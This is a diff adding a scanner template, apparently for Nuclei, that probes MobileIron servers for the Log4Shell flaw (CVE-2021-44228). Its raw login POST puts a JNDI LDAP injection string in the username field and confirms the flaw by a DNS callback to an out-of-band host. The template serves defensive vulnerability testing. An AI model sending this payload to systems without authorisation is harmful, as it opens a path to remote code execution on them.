@@ -1,0 +1,34 @@
+id: mobileiron-log4j-rce
+
+info:
+  name: mobileiron-log4j-rce
+  author: j3ssie
+  reference:
+    - https://github.com/rwincey/CVE-2021-44228-Log4j-Payloads
+  severity: critical
+  tags: log4j,oast
+
+requests:
+  - raw:
+      - |
+        POST /mifs/j_spring_security_check HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: https://{{Hostname}}/mifs/user/login.jsp
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 102
+        Origin: https://{{Hostname}}
+        Connection: close
+        Cookie: JSESSIONID=AAA8EEW60EBF0889B65E117E47F4FEE
+        Upgrade-Insecure-Requests: 1
+
+        j_username=${jndi:ldap://{{interactsh-url}}/aa}&j_password=password&logincontext=employee
+    # matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms DNS Interaction
+        words:
+          - "dns"
